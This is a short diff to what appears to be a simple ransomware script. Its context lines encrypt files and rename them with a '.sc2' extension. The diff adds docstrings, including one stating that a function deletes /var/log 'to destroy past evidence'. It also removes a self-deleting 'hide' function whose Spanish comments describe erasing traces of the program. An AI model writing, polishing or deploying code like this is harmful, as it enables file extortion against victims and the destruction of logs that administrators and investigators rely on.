@@ -53,19 +53,16 @@ def fast_encrypt(f:str,pub_key:bytes):
     os.rename(f, f + ".sc2")
 
 
-def main(file):
+def main(file:str):
+    """
+    Encrypt a file using the default option of keys stored in text files
+    """
     encrypt(file)
 
 
 def off_to_see_the_wizard():
-    # ELIMINA TODOS LOS LOGS PARA DESTRUIR EVIDENCIA
+    """
+    Deletes the /var/log directory in order to destroy past evidence
+    """
     os.rmdir("/var/log")
-    return True
-
-
-def hide():
-    # LA IDEA ES QUE SE AUTO ELIMINE PARA DESTRUIR EVIDENCIA
-    # ESTO SOLO FUNCIONA SI EL PROGRAMA QUEDA EJECUTANDOSE EN
-    # LA MEMORIA
-    os.rmdir("../Ransom-basic")
     return True
